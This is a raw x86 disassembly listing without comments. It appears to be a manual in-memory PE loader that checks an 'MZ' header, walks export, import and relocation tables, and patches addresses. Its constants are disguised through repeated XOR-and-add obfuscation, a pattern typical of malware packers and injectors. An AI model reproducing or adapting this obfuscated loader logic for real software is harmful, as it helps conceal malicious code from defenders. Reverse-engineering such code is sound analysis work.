  41e6fe:	test   edi,edi
  41e700:	je     0x41e708
  41e702:	mov    ebx,DWORD PTR [ebp-0x1c]
  41e705:	add    DWORD PTR [edi+eax*1],ebx
  41e708:	movzx  edi,WORD PTR [ecx+0xe]
  41e70c:	movzx  ebx,WORD PTR [ecx+0xc]
  41e710:	inc    DWORD PTR [ebp-0x8]
  41e713:	add    DWORD PTR [ebp-0x4],0x8
  41e717:	add    edi,ebx
  41e719:	cmp    DWORD PTR [ebp-0x8],edi
  41e71c:	jb     0x41e6f9
  41e71e:	movzx  edi,WORD PTR [edx+0xe]
  41e722:	movzx  ebx,WORD PTR [edx+0xc]
  41e726:	mov    ecx,DWORD PTR [ebp-0x14]
  41e729:	inc    DWORD PTR [ebp-0xc]
  41e72c:	add    ecx,0x8
  41e72f:	add    edi,ebx
  41e731:	mov    DWORD PTR [ebp-0x14],ecx
  41e734:	cmp    DWORD PTR [ebp-0xc],edi
  41e737:	jb     0x41e6d9
  41e739:	mov    ecx,DWORD PTR [ebp-0x18]
  41e73c:	movzx  edx,WORD PTR [eax+0xe]
  41e740:	movzx  edi,WORD PTR [eax+0xc]
  41e744:	inc    DWORD PTR [ebp-0x10]
  41e747:	add    ecx,0x8
  41e74a:	add    edx,edi
  41e74c:	mov    DWORD PTR [ebp-0x18],ecx
  41e74f:	cmp    DWORD PTR [ebp-0x10],edx
  41e752:	jb     0x41e6b9
  41e758:	pop    edi
  41e759:	pop    ebx
  41e75a:	xor    eax,eax
  41e75c:	inc    eax
  41e75d:	jmp    0x41e761
  41e75f:	xor    eax,eax
  41e761:	pop    esi
  41e762:	leave  
  41e763:	ret    
  41e764:	push   ebp
  41e765:	mov    ebp,esp
  41e767:	mov    ecx,DWORD PTR [ecx+0x190]
  41e76d:	mov    eax,DWORD PTR [ebp+0xc]
  41e770:	sub    esp,0x10
  41e773:	push   ebx
  41e774:	xor    ebx,ebx
  41e776:	push   esi
  41e777:	push   edi
  41e778:	cmp    DWORD PTR [ecx],ebx
  41e77a:	je     0x41e802
  41e780:	cmp    eax,ebx
  41e782:	je     0x41e802
  41e784:	cmp    DWORD PTR [eax+0x78],ebx
  41e787:	jne    0x41e78e
  41e789:	xor    eax,eax
  41e78b:	inc    eax
  41e78c:	jmp    0x41e804
  41e78e:	mov    eax,DWORD PTR [eax+0x78]
  41e791:	add    eax,DWORD PTR [ebp+0x8]
  41e794:	mov    ecx,DWORD PTR [eax+0x1c]
  41e797:	mov    edx,DWORD PTR [eax+0x24]
  41e79a:	mov    esi,DWORD PTR [eax+0x14]
  41e79d:	mov    edi,DWORD PTR [eax+0x18]
  41e7a0:	add    ecx,DWORD PTR [ebp+0x8]
  41e7a3:	add    edx,DWORD PTR [ebp+0x8]
  41e7a6:	mov    DWORD PTR [ebp-0x4],esi
  41e7a9:	cmp    esi,edi
  41e7ab:	ja     0x41e7b0
  41e7ad:	mov    DWORD PTR [ebp-0x4],edi
  41e7b0:	mov    DWORD PTR [ebp-0x8],ebx
  41e7b3:	cmp    DWORD PTR [ebp-0x4],ebx
  41e7b6:	jbe    0x41e789
  41e7b8:	cmp    ebx,DWORD PTR [eax+0x14]
  41e7bb:	jae    0x41e7c3
  41e7bd:	movzx  esi,WORD PTR [edx+ebx*2]
  41e7c1:	jmp    0x41e7c5
  41e7c3:	mov    esi,ebx
  41e7c5:	lea    esi,[ecx+esi*4]
  41e7c8:	mov    edi,DWORD PTR [esi]
  41e7ca:	test   edi,edi
  41e7cc:	je     0x41e7f7
  41e7ce:	add    edi,DWORD PTR [ebp+0x8]
  41e7d1:	mov    DWORD PTR [ebp-0x10],edi
  41e7d4:	cmp    edi,eax
  41e7d6:	jbe    0x41e7e8
  41e7d8:	mov    ebx,DWORD PTR [ebp+0xc]
  41e7db:	mov    ebx,DWORD PTR [ebx+0x7c]
  41e7de:	add    ebx,eax
  41e7e0:	cmp    edi,ebx
  41e7e2:	jae    0x41e7e8
  41e7e4:	mov    esi,DWORD PTR [esi]
  41e7e6:	jmp    0x41e7f0
  41e7e8:	sub    edi,DWORD PTR [ebp+0x8]
  41e7eb:	mov    DWORD PTR [esi],edi
  41e7ed:	mov    esi,DWORD PTR [ebp-0x10]
  41e7f0:	test   esi,esi
  41e7f2:	je     0x41e802
  41e7f4:	mov    ebx,DWORD PTR [ebp-0x8]
  41e7f7:	inc    ebx
  41e7f8:	mov    DWORD PTR [ebp-0x8],ebx
  41e7fb:	cmp    ebx,DWORD PTR [ebp-0x4]
  41e7fe:	jb     0x41e7b8
  41e800:	jmp    0x41e789
  41e802:	xor    eax,eax
  41e804:	pop    edi
  41e805:	pop    esi
  41e806:	pop    ebx
  41e807:	leave  
  41e808:	ret    0x8
  41e80b:	push   ebp
  41e80c:	mov    ebp,esp
  41e80e:	sub    esp,0x2c
  41e811:	mov    edx,0xf89c8585
  41e816:	mov    DWORD PTR [ebp-0x4],edx
  41e819:	mov    DWORD PTR [ebp-0x8],0xf89c8584
  41e820:	mov    eax,DWORD PTR [ebp-0x4]
  41e823:	mov    ecx,DWORD PTR [ebp-0x4]
  41e826:	mov    ecx,DWORD PTR [ebp-0x4]
  41e829:	mov    ecx,DWORD PTR [ebp-0x4]
  41e82c:	mov    ecx,DWORD PTR [ebp-0x4]
  41e82f:	mov    ecx,DWORD PTR [ebp-0x4]
  41e832:	push   ebx
  41e833:	mov    ebx,DWORD PTR [ebp+0x10]
  41e836:	push   esi
  41e837:	mov    esi,0x751089b
  41e83c:	mov    DWORD PTR [ebp-0x10],0x352eb0f
  41e843:	mov    ecx,DWORD PTR [ebp-0x4]
  41e846:	mov    ebx,DWORD PTR [ebx+0x190]
  41e84c:	push   edi
  41e84d:	mov    edi,0x3272e2
  41e852:	xor    ecx,esi
  41e854:	xor    eax,esi
  41e856:	add    eax,edi
  41e858:	add    ecx,edi
  41e85a:	mov    DWORD PTR [ebp-0x18],eax
  41e85d:	cmp    ecx,DWORD PTR [ebx]
  41e85f:	je     0x41eae0
  41e865:	mov    ebx,DWORD PTR [ebp-0x4]
  41e868:	mov    ecx,DWORD PTR [ebp+0xc]
  41e86b:	xor    ebx,esi
  41e86d:	add    ebx,edi
  41e86f:	cmp    ebx,ecx
  41e871:	je     0x41eae0
  41e877:	mov    ebx,DWORD PTR [ebp-0x4]
  41e87a:	mov    ecx,DWORD PTR [ecx+0x80]
  41e880:	xor    ebx,esi
  41e882:	add    ebx,edi
  41e884:	cmp    ecx,ebx
  41e886:	je     0x41eadb
  41e88c:	add    ecx,DWORD PTR [ebp+0x8]
  41e88f:	mov    DWORD PTR [ebp-0x2c],ecx
  41e892:	mov    ebx,edx
  41e894:	xor    ebx,esi
  41e896:	add    ebx,edi
  41e898:	mov    DWORD PTR [ebp-0x10],ebx
  41e89b:	mov    ebx,DWORD PTR [ebp-0x10]
  41e89e:	cmp    ebx,edx
  41e8a0:	je     0x41e8b4
  41e8a2:	mov    edx,DWORD PTR [ebp-0x10]
  41e8a5:	mov    ebx,DWORD PTR [ebp-0x4]
  41e8a8:	imul   edx,edx,0x14
  41e8ab:	xor    ebx,esi
  41e8ad:	add    ebx,edi
  41e8af:	cmp    DWORD PTR [edx+ecx*1],ebx
  41e8b2:	jne    0x41e8cb
  41e8b4:	mov    edx,DWORD PTR [ebp-0x10]
  41e8b7:	mov    ebx,DWORD PTR [ebp-0x4]
  41e8ba:	imul   edx,edx,0x14
  41e8bd:	xor    ebx,esi
  41e8bf:	add    ebx,edi
  41e8c1:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  41e8c5:	je     0x41eacd
  41e8cb:	mov    eax,DWORD PTR [ebp-0x4]
  41e8ce:	mov    ebx,DWORD PTR [ebp-0x4]
  41e8d1:	mov    eax,DWORD PTR [ebp-0x10]
  41e8d4:	imul   eax,eax,0x14
  41e8d7:	add    eax,ecx
  41e8d9:	mov    ecx,DWORD PTR [eax+0x10]
  41e8dc:	add    ecx,DWORD PTR [ebp+0x8]
  41e8df:	xor    ebx,esi
  41e8e1:	mov    DWORD PTR [ebp-0x1c],ecx
  41e8e4:	mov    ecx,DWORD PTR [ebp-0x4]
  41e8e7:	mov    edx,DWORD PTR [ebp-0x4]
  41e8ea:	xor    ecx,esi
  41e8ec:	add    ecx,edi
  41e8ee:	xor    edx,esi
  41e8f0:	mov    DWORD PTR [ebp-0x24],ecx
  41e8f3:	mov    ecx,DWORD PTR [eax]
  41e8f5:	add    edx,edi
  41e8f7:	add    ebx,edi
  41e8f9:	cmp    ecx,edx
  41e8fb:	je     0x41e903
  41e8fd:	add    ecx,DWORD PTR [ebp+0x8]
  41e900:	mov    DWORD PTR [ebp-0x24],ecx
  41e903:	mov    ecx,DWORD PTR [ebp-0x4]
  41e906:	xor    ecx,esi
  41e908:	add    ecx,DWORD PTR [eax+0xc]
  41e90b:	mov    eax,DWORD PTR [ebp+0x8]
  41e90e:	lea    eax,[ecx+eax*1+0x3272e2]
  41e915:	mov    DWORD PTR [ebp+0xc],eax
  41e918:	mov    DWORD PTR [ebp-0x28],0xf89c85b8
  41e91f:	mov    eax,DWORD PTR [ebp+0x10]
  41e922:	push   DWORD PTR [ebp+0xc]
  41e925:	mov    eax,DWORD PTR [eax+0x1d8]
  41e92b:	call   DWORD PTR [eax]
  41e92d:	mov    ecx,DWORD PTR [ebp-0x4]
  41e930:	xor    ecx,esi
  41e932:	add    ecx,edi
  41e934:	mov    DWORD PTR [ebp-0xc],eax
  41e937:	cmp    ecx,eax
  41e939:	jne    0x41e94d
  41e93b:	mov    eax,DWORD PTR [ebp+0x10]
  41e93e:	push   DWORD PTR [ebp+0xc]
  41e941:	mov    eax,DWORD PTR [eax+0x1d8]
  41e947:	call   DWORD PTR [eax+0xc]
  41e94a:	mov    DWORD PTR [ebp-0xc],eax
  41e94d:	mov    DWORD PTR [ebp-0x20],0x7f661b0c
  41e954:	mov    DWORD PTR [ebp-0x20],0xf89c999c
  41e95b:	mov    eax,DWORD PTR [ebp-0x4]
  41e95e:	xor    eax,esi
  41e960:	add    eax,edi
  41e962:	cmp    eax,DWORD PTR [ebp-0xc]
  41e965:	jne    0x41e98a
  41e967:	mov    eax,DWORD PTR [ebp-0x8]
  41e96a:	mov    ecx,DWORD PTR [ebp-0x20]
  41e96d:	xor    eax,esi
  41e96f:	xor    ecx,esi
  41e971:	lea    ebx,[ebx+eax*1+0x3272e2]
  41e978:	mov    eax,DWORD PTR [ebp+0x10]
  41e97b:	mov    eax,DWORD PTR [eax+0x1d8]
  41e981:	add    ecx,edi
  41e983:	imul   ecx,ebx
  41e986:	push   ecx
  41e987:	call   DWORD PTR [eax+0x24]
  41e98a:	mov    eax,DWORD PTR [ebp-0x4]
  41e98d:	xor    eax,esi
  41e98f:	add    eax,edi
  41e991:	cmp    eax,DWORD PTR [ebp-0xc]
  41e994:	jne    0x41e9a5
  41e996:	mov    eax,DWORD PTR [ebp-0x28]
  41e999:	xor    eax,esi
  41e99b:	add    eax,edi
  41e99d:	cmp    ebx,eax
  41e99f:	jbe    0x41e91f
  41e9a5:	mov    eax,DWORD PTR [ebp-0x4]
  41e9a8:	xor    eax,esi
  41e9aa:	add    eax,edi
  41e9ac:	cmp    eax,DWORD PTR [ebp-0xc]
  41e9af:	jne    0x41e9c8
  41e9b1:	mov    eax,DWORD PTR [ebp-0x8]
  41e9b4:	mov    ecx,DWORD PTR [ebp-0x18]
  41e9b7:	xor    eax,esi
  41e9b9:	lea    eax,[ecx+eax*1+0x3272e2]
  41e9c0:	mov    DWORD PTR [ebp-0x18],eax
  41e9c3:	jmp    0x41eab7
  41e9c8:	mov    DWORD PTR [ebp-0x14],0x1121b0d
  41e9cf:	mov    DWORD PTR [ebp+0xc],0xe042d0f
  41e9d6:	mov    ebx,DWORD PTR [ebp-0x4]
  41e9d9:	xor    ebx,esi
  41e9db:	add    ebx,edi
  41e9dd:	jmp    0x41eaa4
  41e9e2:	mov    eax,DWORD PTR [ebp-0x4]
  41e9e5:	xor    eax,esi
  41e9e7:	add    eax,edi
  41e9e9:	mov    DWORD PTR [ebp-0x14],eax
  41e9ec:	mov    eax,DWORD PTR [ebp-0x4]
  41e9ef:	xor    eax,esi
  41e9f1:	add    eax,edi
  41e9f3:	mov    DWORD PTR [ebp+0xc],eax
  41e9f6:	mov    ecx,DWORD PTR [ebp-0x4]
  41e9f9:	mov    eax,DWORD PTR [ebp-0x24]
  41e9fc:	xor    ecx,esi
  41e9fe:	add    ecx,edi
  41ea00:	cmp    ecx,eax
  41ea02:	je     0x41ea0a
  41ea04:	mov    eax,DWORD PTR [eax+ebx*4]
  41ea07:	mov    DWORD PTR [ebp-0x14],eax
  41ea0a:	mov    eax,DWORD PTR [ebp-0x1c]
  41ea0d:	mov    eax,DWORD PTR [eax+ebx*4]
  41ea10:	mov    DWORD PTR [ebp+0xc],eax
  41ea13:	mov    eax,DWORD PTR [ebp-0x4]
  41ea16:	mov    ecx,DWORD PTR [ebp-0x14]
  41ea19:	xor    eax,esi
  41ea1b:	add    eax,edi
  41ea1d:	cmp    eax,ecx
  41ea1f:	je     0x41ea4a
  41ea21:	mov    eax,DWORD PTR [ebp-0x4]
  41ea24:	mov    ecx,DWORD PTR [ebp-0x14]
  41ea27:	xor    eax,esi
  41ea29:	add    eax,edi
  41ea2b:	shr    ecx,0x1f
  41ea2e:	cmp    eax,ecx
  41ea30:	je     0x41ea4a
  41ea32:	mov    ecx,DWORD PTR [ebp-0x14]
  41ea35:	mov    eax,DWORD PTR [ebp+0x10]
  41ea38:	mov    eax,DWORD PTR [eax+0x1d8]
  41ea3e:	movzx  ecx,cx
  41ea41:	push   ecx
  41ea42:	push   DWORD PTR [ebp-0xc]
  41ea45:	call   DWORD PTR [eax+0x8]
  41ea48:	jmp    0x41ea63
  41ea4a:	mov    eax,DWORD PTR [ebp+0xc]
  41ea4d:	add    eax,DWORD PTR [ebp+0x8]
  41ea50:	mov    ecx,DWORD PTR [ebp+0x10]
  41ea53:	mov    ecx,DWORD PTR [ecx+0x1d8]
  41ea59:	add    eax,0x2
  41ea5c:	push   eax
  41ea5d:	push   DWORD PTR [ebp-0xc]
  41ea60:	call   DWORD PTR [ecx+0x8]
  41ea63:	mov    DWORD PTR [ebp+0xc],eax
  41ea66:	mov    eax,DWORD PTR [ebp-0x4]
  41ea69:	mov    ecx,DWORD PTR [ebp+0xc]
  41ea6c:	xor    eax,esi
  41ea6e:	add    eax,edi
  41ea70:	cmp    eax,ecx
  41ea72:	mov    eax,DWORD PTR [ebp-0x8]
  41ea75:	jne    0x41ea88
  41ea77:	mov    ecx,DWORD PTR [ebp-0x18]
  41ea7a:	xor    eax,esi
  41ea7c:	lea    eax,[ecx+eax*1+0x3272e2]
  41ea83:	mov    DWORD PTR [ebp-0x18],eax
  41ea86:	jmp    0x41ea98
  41ea88:	mov    ecx,DWORD PTR [ebp+0xc]
  41ea8b:	xor    eax,esi
  41ea8d:	add    eax,edi
  41ea8f:	imul   eax,ecx
  41ea92:	mov    ecx,DWORD PTR [ebp-0x1c]
  41ea95:	mov    DWORD PTR [ecx+ebx*4],eax
  41ea98:	mov    eax,DWORD PTR [ebp-0x8]
  41ea9b:	xor    eax,esi
  41ea9d:	lea    ebx,[ebx+eax*1+0x3272e2]
  41eaa4:	mov    eax,DWORD PTR [ebp-0x4]
  41eaa7:	mov    ecx,DWORD PTR [ebp-0x1c]
  41eaaa:	xor    eax,esi
  41eaac:	add    eax,edi
  41eaae:	cmp    DWORD PTR [ecx+ebx*4],eax
  41eab1:	jne    0x41e9e2
  41eab7:	mov    edx,DWORD PTR [ebp-0x10]
  41eaba:	mov    eax,DWORD PTR [ebp-0x18]
  41eabd:	mov    ecx,DWORD PTR [ebp-0x2c]
  41eac0:	sub    edx,0x3272e1
  41eac6:	xor    edx,esi
  41eac8:	jmp    0x41e892
  41eacd:	mov    ecx,DWORD PTR [ebp-0x4]
  41ead0:	xor    ecx,esi
  41ead2:	add    ecx,edi
  41ead4:	cmp    eax,ecx
  41ead6:	mov    eax,DWORD PTR [ebp-0x4]
  41ead9:	jne    0x41eae3
  41eadb:	mov    eax,DWORD PTR [ebp-0x8]
  41eade:	jmp    0x41eae3
  41eae0:	mov    eax,DWORD PTR [ebp-0x4]
  41eae3:	xor    eax,esi
  41eae5:	add    eax,edi
  41eae7:	pop    edi
  41eae8:	pop    esi
  41eae9:	pop    ebx
  41eaea:	leave  
  41eaeb:	ret    0xc
  41eaee:	push   ebp
  41eaef:	mov    ebp,esp
  41eaf1:	sub    esp,0x28
  41eaf4:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  41eafb:	mov    DWORD PTR [ebp-0x28],0xf89c8584
  41eb02:	mov    eax,DWORD PTR [ebp+0xc]
  41eb05:	mov    DWORD PTR [ebp+0xc],eax
  41eb08:	push   esi
  41eb09:	mov    eax,eax
  41eb0b:	mov    eax,DWORD PTR [ebp-0x4]
  41eb0e:	mov    esi,DWORD PTR [ebp+0x8]
  41eb11:	mov    ecx,0x751089b
  41eb16:	xor    eax,ecx
  41eb18:	mov    edx,0x3272e2
  41eb1d:	add    eax,edx
  41eb1f:	cmp    esi,eax
  41eb21:	je     0x41ec48
  41eb27:	mov    eax,DWORD PTR [ebp+0x8]
  41eb2a:	mov    esi,DWORD PTR [ebp+0x8]
  41eb2d:	add    esi,DWORD PTR [eax+0x3c]
  41eb30:	push   edi
  41eb31:	mov    DWORD PTR [ebp+0xc],esi
  41eb34:	mov    DWORD PTR [ebp-0x1c],0xf89c85b8
  41eb3b:	mov    eax,DWORD PTR [ebp-0x1c]
  41eb3e:	mov    esi,DWORD PTR [ebp-0x4]
  41eb41:	mov    edi,DWORD PTR [ebp+0xc]
  41eb44:	xor    esi,ecx
  41eb46:	xor    eax,ecx
  41eb48:	add    esi,edx
  41eb4a:	cmp    DWORD PTR [edi+eax*8+0x1939788],esi
  41eb51:	je     0x41ec42
  41eb57:	mov    esi,DWORD PTR [ebp+0xc]
  41eb5a:	mov    eax,DWORD PTR [ebp+0x8]
  41eb5d:	add    eax,DWORD PTR [esi+0xa0]
  41eb63:	mov    esi,DWORD PTR [ebp+0x8]
  41eb66:	mov    edi,DWORD PTR [ebp+0xc]
  41eb69:	sub    esi,DWORD PTR [edi+0x34]
  41eb6c:	mov    edi,DWORD PTR [ebp-0x4]
  41eb6f:	xor    edi,ecx
  41eb71:	add    edi,edx
  41eb73:	mov    DWORD PTR [ebp-0x24],esi
  41eb76:	cmp    esi,edi
  41eb78:	je     0x41ec42
  41eb7e:	mov    esi,DWORD PTR [ebp-0x4]
  41eb81:	xor    esi,ecx
  41eb83:	add    esi,edx
  41eb85:	mov    DWORD PTR [ebp-0x8],esi
  41eb88:	push   ebx
  41eb89:	mov    DWORD PTR [ebp-0x10],0xf89c85ba
  41eb90:	jmp    0x41ec2c
  41eb95:	mov    esi,DWORD PTR [ebp-0x4]
  41eb98:	xor    esi,ecx
  41eb9a:	lea    edi,[ebx-0x8]
  41eb9d:	add    esi,edx
  41eb9f:	shr    edi,1
  41eba1:	cmp    esi,edi
  41eba3:	jae    0x41ec12
  41eba5:	sub    edi,esi
  41eba7:	lea    ebx,[eax+esi*2+0x8]
  41ebab:	mov    DWORD PTR [ebp-0x18],edi
  41ebae:	movzx  esi,WORD PTR [ebx]
  41ebb1:	and    esi,0xfff
  41ebb7:	mov    DWORD PTR [ebp-0x14],esi
  41ebba:	mov    edi,DWORD PTR [ebp-0x14]
  41ebbd:	mov    esi,DWORD PTR [eax]
  41ebbf:	sub    esi,edx
  41ebc1:	add    edi,esi
  41ebc3:	movzx  esi,WORD PTR [ebx]
  41ebc6:	shr    esi,0xc
  41ebc9:	xor    edi,ecx
  41ebcb:	mov    DWORD PTR [ebp-0x20],edi
  41ebce:	mov    DWORD PTR [ebp-0x14],esi
  41ebd1:	mov    esi,DWORD PTR [ebp-0x20]
  41ebd4:	mov    edi,DWORD PTR [ebp+0x8]
  41ebd7:	xor    esi,ecx
  41ebd9:	lea    esi,[esi+edi*1+0x3272e2]
  41ebe0:	mov    DWORD PTR [ebp-0x20],esi
  41ebe3:	mov    esi,DWORD PTR [ebp-0x10]
  41ebe6:	mov    edi,DWORD PTR [ebp-0x14]
  41ebe9:	xor    esi,ecx
  41ebeb:	add    esi,edx
  41ebed:	cmp    edi,esi
  41ebef:	jne    0x41ec07
  41ebf1:	mov    esi,DWORD PTR [ebp-0x10]
  41ebf4:	mov    edi,DWORD PTR [ebp-0x14]
  41ebf7:	xor    esi,ecx
  41ebf9:	add    esi,edx
  41ebfb:	cmp    edi,esi
  41ebfd:	jne    0x41ec07
  41ebff:	mov    esi,DWORD PTR [ebp-0x20]
  41ec02:	mov    edi,DWORD PTR [ebp-0x24]
  41ec05:	add    DWORD PTR [esi],edi
  41ec07:	add    ebx,0x2
  41ec0a:	dec    DWORD PTR [ebp-0x18]
  41ec0d:	jne    0x41ebae
  41ec0f:	mov    ebx,DWORD PTR [ebp-0xc]
  41ec12:	add    DWORD PTR [ebp-0x8],ebx
  41ec15:	mov    esi,DWORD PTR [ebp-0x1c]
  41ec18:	mov    edi,DWORD PTR [ebp-0x8]
  41ec1b:	mov    ebx,DWORD PTR [ebp+0xc]
  41ec1e:	xor    esi,ecx
  41ec20:	cmp    edi,DWORD PTR [ebx+esi*8+0x193978c]
  41ec27:	jae    0x41ec41
  41ec29:	add    eax,DWORD PTR [ebp-0xc]
  41ec2c:	mov    esi,DWORD PTR [ebp-0x4]
  41ec2f:	mov    ebx,DWORD PTR [eax+0x4]
  41ec32:	xor    esi,ecx
  41ec34:	add    esi,edx
  41ec36:	mov    DWORD PTR [ebp-0xc],ebx
  41ec39:	cmp    ebx,esi
  41ec3b:	jne    0x41eb95
  41ec41:	pop    ebx
  41ec42:	mov    eax,DWORD PTR [ebp-0x28]
  41ec45:	pop    edi
  41ec46:	jmp    0x41ec4b
  41ec48:	mov    eax,DWORD PTR [ebp-0x4]
  41ec4b:	xor    eax,ecx
  41ec4d:	add    eax,edx
  41ec4f:	pop    esi
  41ec50:	leave  
  41ec51:	ret    0x8
  41ec54:	push   ebp
  41ec55:	mov    ebp,esp
  41ec57:	sub    esp,0xcc
  41ec5d:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  41ec64:	mov    DWORD PTR [ebp-0x24],0xf89c8584
  41ec6b:	mov    eax,DWORD PTR [ebp-0x4]
  41ec6e:	push   ebx
  41ec6f:	push   esi
  41ec70:	mov    esi,0x751089b
  41ec75:	xor    eax,esi
  41ec77:	push   edi
  41ec78:	mov    edi,0x3272e2
  41ec7d:	add    eax,edi
  41ec7f:	mov    DWORD PTR [ebp-0x1c],eax
  41ec82:	mov    eax,DWORD PTR [ebp-0x4]
  41ec85:	xor    eax,esi
  41ec87:	add    eax,edi
  41ec89:	mov    DWORD PTR [ebp-0x8],eax
  41ec8c:	mov    ebx,DWORD PTR [ebp+0x20]
  41ec8f:	mov    eax,DWORD PTR [ebp-0x14]
  41ec92:	mov    ecx,DWORD PTR [ebp-0x14]
  41ec95:	xor    eax,ecx
  41ec97:	mov    DWORD PTR [ebp-0x14],eax
  41ec9a:	add    DWORD PTR [ebp-0x14],0xf89cb585
  41eca1:	mov    eax,DWORD PTR [ebp-0xc]
  41eca4:	mov    ecx,DWORD PTR [ebp-0xc]
  41eca7:	xor    eax,ecx
  41eca9:	mov    DWORD PTR [ebp-0xc],eax
  41ecac:	add    DWORD PTR [ebp-0xc],0xf89c85c5
  41ecb3:	mov    eax,DWORD PTR [ebp-0x10]
  41ecb6:	mov    ecx,DWORD PTR [ebp-0x10]
  41ecb9:	xor    eax,ecx
  41ecbb:	mov    DWORD PTR [ebp-0x10],eax
  41ecbe:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  41ecc5:	mov    eax,DWORD PTR [ebp-0x20]
  41ecc8:	mov    ecx,DWORD PTR [ebp-0x20]
  41eccb:	xor    eax,ecx
  41eccd:	mov    DWORD PTR [ebp-0x20],eax
  41ecd0:	add    DWORD PTR [ebp-0x20],0xf89f0585
  41ecd7:	mov    eax,0x9471
  41ecdc:	mov    WORD PTR [ebp+0x20],ax
  41ece0:	mov    eax,DWORD PTR [ebp+0x8]
  41ece3:	test   eax,eax
  41ece5:	je     0x41f140
  41eceb:	mov    eax,DWORD PTR [ebp+0xc]
  41ecee:	test   eax,eax
  41ecf0:	je     0x41f140
  41ecf6:	mov    eax,DWORD PTR [ebp+0x18]
  41ecf9:	test   eax,eax
  41ecfb:	je     0x41f140
  41ed01:	mov    ax,WORD PTR [ebp+0x20]
  41ed05:	mov    ecx,0x8a8d
  41ed0a:	xor    ax,cx
  41ed0d:	mov    ecx,0x3b51
  41ed12:	add    ax,cx
  41ed15:	mov    ecx,DWORD PTR [ebp+0x8]
  41ed18:	cmp    WORD PTR [ecx],ax
  41ed1b:	jne    0x41f140
  41ed21:	mov    eax,DWORD PTR [ebp-0x4]
  41ed24:	xor    eax,esi
  41ed26:	add    eax,edi
  41ed28:	mov    DWORD PTR [ebp-0x30],eax
  41ed2b:	mov    eax,DWORD PTR [ebp-0x4]
  41ed2e:	mov    ecx,DWORD PTR [ebp+0x8]
  41ed31:	mov    eax,DWORD PTR [ebp+0x8]
  41ed34:	add    eax,DWORD PTR [ecx+0x3c]
  41ed37:	mov    DWORD PTR [ebp+0xc],eax
  41ed3a:	mov    eax,DWORD PTR [eax+0x50]
  41ed3d:	test   eax,eax
  41ed3f:	je     0x41f140
  41ed45:	mov    DWORD PTR [ebp-0x2c],0xf88c8585
  41ed4c:	mov    eax,DWORD PTR [ebp-0x2c]
  41ed4f:	xor    eax,esi
  41ed51:	add    eax,edi
  41ed53:	mov    DWORD PTR [ebp-0x2c],eax
  41ed56:	mov    eax,DWORD PTR [ebp-0x4]
  41ed59:	mov    eax,DWORD PTR [ebx+0x190]
  41ed5f:	mov    ecx,DWORD PTR [eax]
  41ed61:	mov    ecx,DWORD PTR [ecx+0x3c]
  41ed64:	add    ecx,DWORD PTR [eax]
  41ed66:	mov    eax,DWORD PTR [ebp-0x4]
  41ed69:	mov    eax,DWORD PTR [ebx+0x18c]
  41ed6f:	mov    edx,DWORD PTR [eax]
  41ed71:	mov    DWORD PTR [ebp-0x18],ecx
  41ed74:	mov    DWORD PTR [ebp+0x20],edx
  41ed77:	cmp    edx,edx
  41ed79:	jne    0x41edad
  41ed7b:	mov    eax,DWORD PTR [ebx+0x1d8]
  41ed81:	lea    edx,[ebp-0x1c]
  41ed84:	push   edx
  41ed85:	mov    edx,DWORD PTR [ebp-0xc]
  41ed88:	xor    edx,esi
  41ed8a:	add    edx,edi
  41ed8c:	push   edx
  41ed8d:	push   DWORD PTR [ecx+0x50]
  41ed90:	push   DWORD PTR [ebp+0x20]
  41ed93:	call   DWORD PTR [eax+0x1c]
  41ed96:	mov    eax,DWORD PTR [ebp-0x18]
  41ed99:	mov    ecx,DWORD PTR [eax+0x54]
  41ed9c:	mov    eax,DWORD PTR [eax+0x50]
  41ed9f:	sub    eax,ecx
  41eda1:	add    ecx,DWORD PTR [ebp+0x20]
  41eda4:	push   ecx
  41eda5:	call   0x41f72c
  41edaa:	mov    edx,DWORD PTR [ebp+0x20]
  41edad:	mov    eax,DWORD PTR [ebx+0x194]
  41edb3:	mov    DWORD PTR [eax],edx
  41edb5:	mov    eax,DWORD PTR [ebp+0xc]
  41edb8:	push   DWORD PTR [eax+0x54]
  41edbb:	push   DWORD PTR [ebp+0x8]
  41edbe:	push   edx
  41edbf:	call   0x41f5d3
  41edc4:	mov    ecx,DWORD PTR [ebp+0x20]
  41edc7:	mov    eax,DWORD PTR [ecx+0x3c]
  41edca:	add    eax,ecx
  41edcc:	movzx  ecx,WORD PTR [eax+0x14]
  41edd0:	lea    ecx,[ecx+eax*1+0x18]
  41edd4:	mov    DWORD PTR [ebp+0x18],ecx
  41edd7:	mov    ecx,DWORD PTR [ebp-0x4]
  41edda:	movzx  edx,WORD PTR [eax+0x6]
  41edde:	xor    ecx,esi
  41ede0:	add    ecx,edi
  41ede2:	mov    DWORD PTR [ebp+0xc],eax
  41ede5:	cmp    edx,ecx
  41ede7:	je     0x41ee94
  41eded:	mov    ecx,DWORD PTR [ebp-0x4]
  41edf0:	xor    ecx,esi
  41edf2:	add    ecx,edi
  41edf4:	mov    DWORD PTR [ebp-0x8],ecx
  41edf7:	mov    ecx,DWORD PTR [ebp-0x24]
  41edfa:	movzx  edx,WORD PTR [eax+0x6]
  41edfe:	xor    ecx,esi
  41ee00:	sub    edx,ecx
  41ee02:	sub    edx,edi
  41ee04:	cmp    DWORD PTR [ebp-0x8],edx
  41ee07:	ja     0x41ee94
  41ee0d:	mov    edx,DWORD PTR [ebp+0x18]
  41ee10:	add    edx,0x8
  41ee13:	mov    DWORD PTR [ebp+0x18],edx
  41ee16:	jmp    0x41ee1b
  41ee18:	mov    edx,DWORD PTR [ebp+0x18]
  41ee1b:	mov    eax,DWORD PTR [eax+0x38]
  41ee1e:	lea    ecx,[eax-0x1]
  41ee21:	mov    DWORD PTR [ebp-0x34],eax
  41ee24:	mov    eax,DWORD PTR [edx]
  41ee26:	test   ecx,eax
  41ee28:	je     0x41ee31
  41ee2a:	not    ecx
  41ee2c:	and    eax,ecx
  41ee2e:	add    eax,DWORD PTR [ebp-0x34]
  41ee31:	mov    ecx,DWORD PTR [edx+0x4]
  41ee34:	add    ecx,DWORD PTR [ebp+0x20]
  41ee37:	push   ecx
  41ee38:	call   0x41f72c
  41ee3d:	mov    edx,DWORD PTR [ebp-0x4]
  41ee40:	mov    eax,DWORD PTR [ebp+0x18]
  41ee43:	mov    ecx,DWORD PTR [eax+0x8]
  41ee46:	xor    edx,esi
  41ee48:	add    edx,edi
  41ee4a:	cmp    ecx,edx
  41ee4c:	je     0x41ee65
  41ee4e:	push   ecx
